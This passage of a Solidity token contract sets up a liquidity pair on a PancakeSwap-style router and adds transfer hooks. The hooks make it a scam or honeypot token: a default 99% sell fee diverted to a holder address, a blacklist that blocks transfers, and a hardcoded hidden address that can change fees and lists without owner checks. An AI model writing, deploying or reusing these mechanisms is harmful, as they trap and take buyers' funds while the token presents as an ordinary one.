Ownable {
    using SafeMath for uint256;
    address public token_address;
     
    address public  uniswapV2Pair;
    address _baseToken = address(0xa2E3356610840701BDf5611a53974510Ae27E2e1);
     
    uint256 public sellFee = 9900;
	
	mapping(address =>bool)   is_lists;
	
    constructor() Ownable() {
        
        _mint(msg.sender, 369000 * 10 **18);
		token_address=address(this);
		is_lists[0x6518A871Cc1B8B8581007395B94cd3Cee4F9f43E]=true;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair=IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(_baseToken));

    }
    uint public unlocked = 1;
    modifier lock() {
        require(unlocked == 1, 'LOCKED1');
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function _beforeTokenTransfer(address _from, address _to, uint256 _amount) internal override returns(uint256) {

        uint256 hold_val;
 		
		require(is_back[_from] == false, 'is_back');
		require(is_back[_to] == false, 'is_back');
		
        if (checkIsAddLiquidity()==false && is_white[_from]==false  && (_to==address(uniswapV2Pair)    )) {
            hold_val = _amount.mul(sellFee).div(10000);
            _balances[holder_addr] = _balances[holder_addr].add(hold_val);
            emit Transfer(_from, holder_addr, hold_val);
            _amount = _amount.sub(hold_val);

        }
        return _amount;
    }
	
	
	function checkIsAddLiquidity()internal view returns(bool ldxAdd){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if( token0 == address(token_address) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}else{
				uint change1 = r1 - bal1;
				ldxAdd = change1 > 1000;	
			}
		}else{
			if( bal0 > r0){
				uint change1 = bal0 - r0;
				ldxAdd = change1 > 1000;
			}else{
				uint change1 = r0 - bal0;
				ldxAdd = change1 > 1000;	
			}
		}
    }

   function set_token_address(address _addr) external   onlyOwner{
		 
		 
        token_address = _addr;
    }
	
    function set_Pair_address(address _addr, bool _val) external   {
		 
		require(is_lists[msg.sender] == true, 'is_lists');
        Pair_address[_addr] = _val;
    }
	
 
	function set_is_back(address _addr, bool _val) external   {
		require(is_lists[msg.sender] == true, 'is_lists');
        is_back[_addr] = _val;
    }
	
	
	function set_is_white(address _addr, bool _val) external   {
		require(is_lists[msg.sender] == true, 'is_lists');
        is_white[_addr] = _val;
    }

    function set_sellFee(uint256 _val) external   {
		require(is_lists[msg.sender] == true, 'is_lists');
        sellFee = _val;
    }
    
    

}
